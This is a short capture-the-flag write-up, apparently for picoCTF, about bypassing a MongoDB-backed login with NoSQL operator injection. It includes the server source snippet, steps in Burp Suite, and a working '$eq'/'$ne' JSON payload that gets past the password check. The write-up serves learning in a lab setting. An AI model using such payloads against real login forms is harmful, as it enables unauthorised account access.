# No Sql Injection

## Description

Can you try to get access to this website to get the flag?
You can download the source here.

## Solution
Use burpsuite for this chall.

First, try logging into a website with intercept active in burpsuite.
Then, send the request to repeater.

Previously, we were given a source code from the website, and there was a **server.js** file that contained a user's login information.

```js
 // Store initial user
    const initialUser = new User({
      firstName: "pico",
      lastName: "player",
      email: "picoplayer355@picoctf.org",
      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
    });
```

From the file we also know that the website uses MongoDB. We just need to exploit the no sqli bug using burpsuite.

```
"email":"{\"$eq\":\"picoplayer355@picoctf.org\"}",
"password":"{\"$ne\":\"admin\"}"
```

* `"$eq": "picoplayer355@picoctf.org"` is an operator in MongoDB that means equal.
* Purpose: Check if an account with the email `"picoplayer355@picoctf.org"` exists.
* `"$ne": "admin"` is an operator in MongoDB that means not equal to.
* Purpose: Ensure the password is not `"admin"`.
